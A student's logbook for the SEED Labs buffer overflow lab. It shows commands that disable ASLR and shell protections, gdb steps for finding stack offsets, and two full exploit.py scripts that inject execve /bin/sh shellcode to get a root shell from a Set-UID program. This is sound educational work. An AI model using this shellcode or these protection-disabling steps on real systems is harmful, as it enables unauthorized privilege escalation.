# LOGBOOK 5

This lab's objective is to learn more about the buffer overflow vulnerability and how to exploit it. 
A buffer overflow can occur when a program attempts to put more data in a buffer than the buffers storage capacity allows. This causes the program to overwrite adjacent memory locations and it could potentially lead to the execution of malicious code.


## Environment Setup

### Turning Off Countermeasures

In order to be able to attempt a buffer overflow attack, we need to disable some security features that the Operating System has in place to prevent such an atack.

- **Address Space Randomization**

Address Space Randomization is a technique used to randomize the location where system executables are loaded into memory, increasing the difficulty of guessing a certain memory address. To disable this feature in Ubuntu, we used the following command: 

```bash
$ sudo sysctl -w kernel.randomize_va_space=0
```


- **Configuring /bin/sh**

Bash has a security countermeasure to prevent itself from being executed in a Set-UID process. To bypass this, we will link /bin/sh to another shell that allows us to run a Set-UID program. We used the following command to link /bin/sh to zsh shell program:

```bash
$ sudo ln -sf /bin/zsh /bin/sh
```

- **StackGuard and Non-Executable Stack**

We will also turn off these two additional security countermeasures that the system employs during compilation.


## Task 1: Getting Familiar with Shellcode

We compiled the shellcode (which is code that launches a shell) using a Makefile - both provided by SEED Labs. To do so, we only had to type `make` in the shell. This process generated two binaries: one that is 32-bit and another one that is 64-bit. We then executed these binary files, with both of them launching a new shell session. This new shell session allows the execution of commands just like any other common shell.


![log5_task1](./images/logbook-5/_task1.png){width=35%}


## Task 2: Understanding the Vulnerable Program

For task 2, SEED Labs provides a program named *stack.c* that contains a buffer overflow vulnerability. The program initially reads input from the file *badfile*, which is then passed to a buffer inside the `bof` function. The input can have 517 bytes; however, the buffer size inside the `bof` function is less than 517. Since `strcpy` does not check boundaries, it will copy 517 bytes to a buffer of 100 bytes, **resulting in a buffer overflow**.

In order to compile *stack.c*, we must first turn off the StackGuard and the non-executable stack protections. We also have to turn the program into a Set-UID program and change its ownership to root, which we have learned how to do in the previous lab. This can all be achieved through the following commands:

```bash
$ gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c
$ sudo chown root stack 
$ sudo chmod 4755 stack

```

For our particular case, we simply ran `make` to compile command, since the compilation and setup commands were already included in the Makefile provided by SEED Labs. 


## Task 3: Launching Attack on 32-bit Program (Level 1)

From the SEED Lab, we learned that the most important thing to know when exploiting a buffer overflow vulnerability is the **distance between the buffer’s starting position and the place where the return address is stored**.
Therefore, and since we are in possession of the target program's source code, we compiled and ran the program in debug mode; this allowed us to learn about the location of each variable in the stack.

We started by running the `make all` command, after which we create an empty *badfile* file (so that read does not fail).

```bash
make all
touch badfile
```

Then, we ran the command to start the debugging session.

```bash
gdb stack-L1-dbg
```

During the debugging session, the commands bellow were inserted (as in the SEED Lab tutorial) with the goal of obtaining the `ebp` (frame pointer) and the starting address of `buffer`.

- `b bof` created a breakpoint at the start of the `bof` function
- `run` ran the program up until the `bof` function was called
- `next` allowed the debugging of code step by step
- `p $ebp` printed the value of `ebp`
- `p &buffer` printed the address where the buffer starts
- `quit` exited the debugging session


```bash
b bof
run
next
p $ebp
p &buffer
quit
```
We ended up with `ebp = 0xffffcb08` and `buffer = 0xffffca9c`.

***Note:*** `ebp`'s value is the address of the `bof` function stack frame, where the return address is located.

![addresses](./images/logbook-5/addresses.png)

With this information, we then proceeded to execute the last part of the task by adapting the *exploit.py* program:

- `shellcode` the shellcode to be injected; we retrieved the shellcode previously used in task 1 of the SEED Lab
- `start` the starting position of the shellcode (length of content (517) - lenght of shellcode)
- `ret` the return address the program should jump to after the `bof` function has been fully executed (buffer's address + start)
- `offset` the position of the `bof` function's return address (ebp address - buffer's address + 4 (the size of a pointer in a 32-bit executable - the frame pointer))

After modifying the program, we then proceeded to executing it.

```py
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"  
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 517-len(shellcode)               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffca9c + start          # Change this number 
offset = 0xffffcb08 - 0xffffca9c + 4             # Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

To finish it up, we ran *stack-L1* and got access to the root.

![root](./images/logbook-5/root.png)


## Task 4: Launching Attack without Knowing Buffer Size (Level 2)

We were then challenged to solve the previous task, but without knowing the size of the buffer; in other words, the address of ebp (the frame pointer).

To achieve that, we followed the same steps as we did in task 3, from the initial phase up until right before the execution of *exploit.py*, although we debugged through *stack-L2-dbg* and did not ask for address of ebp.

Not knowing this additional address lead us to make changes on *exploit.py* resulting in the following script:

- `value` is the size of the "jump" from the starting address and, as we know that the buffer size is between 100 and 200, we tried this to be 300; if that had not succeeded, that would've meant that the "jump" wasn't big enough and we would've had to try higher numbers.

- As we don't know exactly where the return address is, we needed to have various locations with it. Also, as we were told that the value stored in the frame pointer is always a multiple of four, we divided the maximum size of the buffer, 200, by 4, getting the 50 value of the for loop.

```python
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"  
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
##start = 517-len(shellcode)               # Change this number 
content[517-len(shellcode):] = shellcode #put the shellcode at the end of the bad file

# Decide the return address value 
# and put it somewhere in the payload
value = 300
ret    = 0xffffca9c + value          # Change this number 
#offset = 0xffffcb08 - 0xffffca9c + 4             # Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address

#Spray the buffer with return addresses
for offset in range(50):
	content[offset*L:offset*4 + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)

```

Utilizing this, we were able to reach the same result as in task 3.

![root2](./images/logbook-5/root2.png)
